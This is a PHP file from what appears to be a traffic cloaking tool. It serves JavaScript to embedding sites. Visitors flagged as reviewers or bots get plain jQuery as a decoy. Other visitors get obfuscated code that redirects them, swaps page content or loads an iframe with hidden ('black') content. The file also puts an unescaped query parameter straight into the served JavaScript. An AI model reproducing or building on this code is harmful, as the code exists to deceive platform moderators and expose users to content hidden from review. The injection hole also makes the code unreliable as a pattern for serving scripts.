<?php
//This file must be included if you want to connect the cloaker using Javascript.
//This works good for any website builders or GitHub for example.
//Use the following code: <script src="https://your.domain/js/index.php"></script>
//If the user passes the verification, the action you specified for the JS connection in campaign settings
//will be performed: 
//1.redirect 
//2.content substitution 
//3.show iframe
require_once __DIR__.'/obfuscator.php';
require_once __DIR__.'/../db/db.php';
require_once __DIR__.'/../debug.php';
require_once __DIR__.'/../settings.php';
require_once __DIR__.'/../requestfunc.php';
require_once __DIR__.'/../campaign.php';
require_once __DIR__.'/../redirect.php';
require_once __DIR__.'/../core.php';
header('Content-Type: text/javascript');

global $db;
$dbCamp = $db->get_campaign_by_currentpath();
if ($dbCamp===null){
    $cs = $db->get_common_settings();
    $c = new Cloaker();
    $db->add_trafficback_click($c->click_params);
    if (empty($cs['trafficBackUrl']))
        die("NO CAMPAIGN FOR THIS DOMAIN AND TRAFFICBACK NOT SET!");
    else{
        jsredirect($cs['trafficBackUrl'],false,true);
        exit();
    }
}

$c = new Campaign($dbCamp['id'],$dbCamp['settings']);
$cloaker = new Cloaker($c->filters);
if($cloaker->is_bad_click()){
    $db->add_white_click($cloaker->click_params, $cloaker->block_reason, $c->campaignId);
    $jq = get("https://code.jquery.com/jquery-3.6.1.min.js");
    echo $jq['content'];
    exit();
}

if ($c->white->jsChecks->enabled) {
    $jsCode= str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__.'/connect.js'));
} else {
    $jsCode = str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__ . '/process.js'));
    $reason = '';
    if (!empty($_GET['reason'])) $reason = $_GET['reason'];
    $jsCode = str_replace('{REASON}', $reason, $jsCode); //пробрасываем js-причину того, что разрешаем переход на блэк
}

if (!DebugMethods::on()) {
    $hunter = new HunterObfuscator($jsCode);
    echo $hunter->Obfuscate();
} else {
    echo $jsCode;
}